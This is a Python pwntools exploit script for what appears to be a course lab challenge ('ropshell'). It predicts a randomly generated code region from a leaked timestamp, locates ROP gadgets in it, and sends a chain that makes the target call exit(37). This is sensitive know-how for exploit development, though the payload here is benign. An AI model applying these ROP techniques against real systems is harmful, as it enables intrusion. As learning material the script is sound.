#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
# import asm
from pwn import asm
import sys

context.arch = 'amd64'
context.os = 'linux'


def get_init_info():
    # remote - sha1
    # msg = r.recvline().decode()
    # print("not yet msg: ", msg)

    # msg = r.recvline().decode()
    # print("not yet msg: ", msg)
    # remote

    msg = r.recvline().decode()
    print(msg)
    print(msg.split(" "))
    timestamp = int(msg.split(" ")[3])
    # timestamp = msg.split(" ")[3]

    msg = r.recvline().decode()
    print(msg)
    code_address = msg.split(" ")[5]

    msg = r.recvline().decode()
    print(msg)  # not important

    print("timestamp ", timestamp)
    print("code_address ", code_address)

    start_code_address_int = int(code_address, base=16) 
    print("start_code_address_int in hex: ", hex(start_code_address_int))

    return timestamp, start_code_address_int


def gen_code_bytes(timestamp):
    """ c code here use to generate the code section content
    srand(t);
    for(i = 0; i < LEN_CODE/4; i++) {
        codeint[i] = (rand()<<16) | (rand() & 0xffff);
    }
    codeint[rand() % (LEN_CODE/4 - 1)] = 0xc3050f;   // 把 syscall ret 埋進去的
    if(mprotect(code, LEN_CODE, PROT_READ|PROT_EXEC) < 0) errquit("mprotect");
    """
    """ mine
    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    libc.srand(timestamp)
    # libc.srand(1683781188)
    LEN_CODE = (10*0x10000)

    codeint = []
    for i in range(0, int(LEN_CODE/4), 1):
        tmp = (libc.rand()<<16) | (libc.rand() & 0xffff)
        tmp &= 0xffffffff  # limit to the lower 32 bits
        codeint.append(tmp)

    codeint[libc.rand() % (int(LEN_CODE/4) - 1)] = 0xc3050f
    # print("codeint len: ", len(codeint))

    code_bytes = b''
    for single_int in codeint:
        byte_array = single_int.to_bytes(4, byteorder='little')
        code_bytes += byte_array

    # print("code_bytes: ", code_bytes)
    return code_bytes
    """
    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    LEN_CODE = 10*0x10000
    fake_code_tmp = []
    print("timestamp: ", timestamp)
    print("timestamp type: ", type(timestamp))
    libc.srand(timestamp)
    for _ in range(int(LEN_CODE/4)):
        tmp = (libc.rand()<<16) | (libc.rand() & 0xffff)
        tmp = tmp & 0xffffffff # mask
        fake_code_tmp.append(tmp)

    fake_code_tmp[int(libc.rand() % (LEN_CODE/4 - 1))] = 0xc3050f
    fake_code = b''

    for curr_code in fake_code_tmp:
        tmp_byte = curr_code.to_bytes(4, 'little')
        fake_code += tmp_byte

    # print("fake_code: ", fake_code[-10:])
    print("fake_code: ", fake_code[0:10])
    # print(type(fake_code))
    # print("fake_code: ", fake_code & 0b000111111)
    return fake_code


def gen_target_asm_arr():
    target_asm_arr = []
    # target_asm_arr.append(asm("ret"))
    # target_asm_arr.append(asm("pop rax\nret"))
    target_asm_arr.append(asm("pop rax\nret"))
    target_asm_arr.append(asm("pop rdi\nret"))
    target_asm_arr.append(asm("syscall\nret"))

    # print("target_asm_arr: ", target_asm_arr)

    return target_asm_arr

def get_asm_abs_pos_arr(target_asm_arr, start_code_address_int):
    # print("find pos: ")
    pos_arr = []
    abs_pos_arr = []
    for target_asm in target_asm_arr:
        pos = code_bytes.find(target_asm)
        # print(hex(pos))
        pos_arr.append(pos)
        abs_pos_arr.append(pos + start_code_address_int)

    # print("abs_pos_arr: ")
    # for abs_pos in abs_pos_arr:
    #     print(hex(abs_pos))

    return abs_pos_arr, pos_arr

def receive_last_msgs():
    for i in range(4):
        msg = r.recvline().decode()
        print(msg)


if __name__ == '__main__':
    r = None
    if 'qemu' in sys.argv[1:]:
        r = process("qemu-x86_64-static ./ropshell", shell=True)
    elif 'bin' in sys.argv[1:]:
        r = process("./ropshell", shell=False)
    elif 'local' in sys.argv[1:]:
        r = remote("localhost", 10494)
    else:
        r = remote("up23.zoolab.org", 10494)

    if type(r) != pwnlib.tubes.process.process:
        pw.solve_pow(r)

    # r.interactive()

    # find target asm
    timestamp, start_code_address_int = get_init_info()
    # timestamp = 1683794692
    print("timestamp: ", timestamp)
    code_bytes = gen_code_bytes(timestamp)
    # print("code_bytes: ", code_bytes)


    target_asm_arr = gen_target_asm_arr()
    print("target_asm_arr: ", target_asm_arr)
    
    asm_abs_pos_arr, pos_arr = get_asm_abs_pos_arr(target_asm_arr, start_code_address_int)

    # send byte code to server
    # send_line = b''.join(n.to_bytes(8, byteorder='little') for n in asm_abs_pos_arr)
    print("asm_abs_pos_arr[0]: ", hex(asm_abs_pos_arr[0]))
    print("asm_abs_pos_arr[1]: ", hex(asm_abs_pos_arr[1]))
    print("asm_abs_pos_arr[2]: ", hex(asm_abs_pos_arr[2]))

    # print("asm_abs_pos_arr: ")
    # for n in asm_abs_pos_arr:
    #     print(hex(n))
    #     print(p64(n))

    # print("check place: ")
    # print("pos arr: ")
    # for n in pos_arr:
    #     print(hex(n))
    # print("target_asm_arr[0] type: ", type(target_asm_arr[0]))
    # print(code_bytes[pos_arr[0]: pos_arr[0] + 4])
    # print(code_bytes[pos_arr[1]: pos_arr[1] + 4])
    # print(code_bytes[pos_arr[2]: pos_arr[2] + 4])
    # print(code_bytes[target_asm_arr[0]: target_asm_arr[0] + 16])
    # print(code_bytes[target_asm_arr[1]: target_asm_arr[1] + 16])
    # print(code_bytes[target_asm_arr[2]: target_asm_arr[2] + 16])


    # send_line = b''.join([p64(n) for n in asm_abs_pos_arr])
    # print(p64(asm_abs_pos_arr[0]))
    # print(p64(60))
    # print(p64(asm_abs_pos_arr[1]))
    # print(p64(37))
    # print(p64(asm_abs_pos_arr[2]))

    # send_line = b''.join([p64(asm_abs_pos_arr[0]), p64(60), p64(asm_abs_pos_arr[1]), p64(37), p64(asm_abs_pos_arr[2])])
    send_line = b''
    send_line += p64(asm_abs_pos_arr[0])
    send_line += p64(60)
    send_line += p64(asm_abs_pos_arr[1])
    send_line += p64(37)
    send_line += p64(asm_abs_pos_arr[2])
                     
    print("send_line - 1: ", send_line)
    # send_line = b''.join([
    #     p64(asm_abs_pos_arr[0], endian='little'),
    #     p64(60, endian='little'),
    #     p64(asm_abs_pos_arr[1], endian='little'),
    #     p64(37, endian='little'),
    #     p64(asm_abs_pos_arr[2], endian='little')
    # ])
    # send_line = b''.join([
    #     p64(asm_abs_pos_arr[0], endian='big'),
    #     p64(60, endian='big'),
    #     p64(asm_abs_pos_arr[1], endian='big'),
    #     p64(37, endian='big'),
    #     p64(asm_abs_pos_arr[2], endian='big')
    # ])
    # send_line = b''.join([p64(asm_abs_pos_arr[2]), p64(37), p64(asm_abs_pos_arr[1]), p64(60), p64(asm_abs_pos_arr[0])])
    # print("send_line - 2: ", send_line)
    r.send(send_line)
    # r.send_raw(send_line)

    r.interactive()
    # receive last msgs
    # receive_last_msgs()



# pop rdi (with exit code 37)
# target_asm = pwn.asm("""pop rdi\nsys_exit\n""")
# target_asm = asm("pop rax\nret") # teacher example

# print("target_asm: ", target_asm)
# print("type: ", type(target_asm))  # bytes

# [need to find]
# pop rax(0x3c) # exit syscall number
# ret

# [need to find]
# pop rdi(37)  # return number in the rdi
# ret

# [need to find]
# syscall
# ret

# send thing:
# pop rax addr
# 0x3c
# pop rdi addr
# 37
# syscall
# ret

# target_asm_1 = asm("pop rax\nret")
# target_asm_2 = asm("pop rdi\nret")
# target_asm_3 = asm("syscall\nret")


# pos_1 = code_bytes.find(target_asm_1)
# pos_2 = code_bytes.find(target_asm_2)
# pos_3 = code_bytes.find(target_asm_3)

# abs_pos_1 = addr_start_int + pos_1
# abs_pos_2 = addr_start_int + pos_2
# abs_pos_3 = addr_start_int + pos_3

# print("abs_pos_1 in hex: ", hex(abs_pos_1))
# print("abs_pos_1 type: ", type(abs_pos_1))
# print("abs_pos_1 len: ", len(abs_pos_1))

# send_line = b''

# nums = [abs_pos_1, 0x3c, abs_pos_2, 0x25, abs_pos_3]
# bs = b''.join(n.to_bytes(8, byteorder='little') for n in nums)
# r.send(bs)

# msg = r.recvline().decode()
# print(msg)

# msg = r.recvline().decode()
# print(msg)

# msg = r.recvline().decode()
# print(msg)

# msg = r.recvline().decode()
# print(msg)

# print("pos: ", pos)
# print("pos hex: ", hex(pos))
# abs_pos = addr_start_int + pos  # use this
# print("abs_pos in hex: ", hex(abs_pos))

# 1. find address

# 2. higher -> lower
#       37
#       abs pos


# pop rdi (with exit code 37)
# target_asm = asm("""pop rdi
# sys_exit
# """)
# print("target_asm: ", target_asm)
# print("type: ", type(target_asm))

# find the target_asm in the codeint
# codeint.find()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :